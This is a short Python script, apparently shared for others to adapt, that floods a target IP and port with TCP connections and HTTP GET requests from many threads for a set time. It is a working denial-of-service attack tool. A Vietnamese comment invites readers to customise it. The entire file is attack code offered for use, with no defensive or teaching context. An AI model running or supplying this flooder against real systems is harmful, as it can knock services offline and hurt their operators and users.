import sys
import socket
import threading
import time
# Do Tôi Ko Chơi Layer 4 Nhiều Nên Script Ae Tự Custom Nhé !!!!
if len(sys.argv) < 5:
    print("Example : python tcp.py ip port time threads")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
attack_time = int(sys.argv[3])  
num_threads = int(sys.argv[4])
start_time = time.time()

def tcp():
    while True:
        if time.time() - start_time > attack_time:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            sock.close()
        except Exception:
            pass

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=tcp)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()